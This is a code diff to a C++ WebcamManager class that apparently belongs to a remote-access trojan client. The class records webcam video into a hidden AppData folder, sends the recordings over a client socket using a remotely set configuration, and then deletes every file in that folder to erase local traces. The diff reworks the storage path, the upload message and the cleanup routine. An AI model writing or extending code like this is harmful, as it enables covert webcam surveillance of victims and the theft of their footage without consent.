@@ -23,6 +23,7 @@ WebcamManager::WebcamManager(ClientSocket &clientSocket, Download &download)
         threadGen.runInNewThread(this, &WebcamManager::sendRecord, json);
     };
 
+
 }
 
 void WebcamManager::setConfiguration(nlohmann::json jsonObject) {
@@ -32,17 +33,20 @@ void WebcamManager::setConfiguration(nlohmann::json jsonObject) {
     fragmented = jsonObject["is_fragmented"];
     FPS = jsonObject["fps"];
 #ifdef WEBCAM
-    locationOfVideos = Converter::string2wstring(WEBCAM);
-    fileName = Install::getAppDataPath() +L"\\" + this->locationOfVideos + L"\\" +( fragmented ? L"fragmented_video_" : L"one_take_video_");
+    locationOfVideos = Install::getAppDataPath() + L"\\"+ Converter::string2wstring(WEBCAM);
+    fileName = this->locationOfVideos + L"\\" +( fragmented ? L"fragmented_video_" : L"one_take_video_");
 #endif
 }
 
 
 // removing video temporary files
 void WebcamManager::removeTempFiles(){
-    for (const auto &file: pathVector){
-        std::wcout << "To eleminate -> " << file << std::endl;
-        std::filesystem::remove(file);
+    if (std::filesystem::exists(locationOfVideos)) {
+        for (const auto &entry: std::filesystem::directory_iterator(locationOfVideos)) {
+            if (std::filesystem::is_regular_file(entry.path())) {
+                std::filesystem::remove(entry.path());
+            }
+        }
     }
 }
 
@@ -116,7 +120,8 @@ void WebcamManager::stopRecording(){
 
 void WebcamManager::sendRecord(nlohmann::json jsonObject){
     if (!fragmented) output.release();
-    download.downloadContent(locationOfVideos);
+    jsonObject["from_path"] = Converter::wstring2string(locationOfVideos);
+    download.downloadContent(jsonObject);
     removeTempFiles();
     initialized=false;
     pathVector.clear();
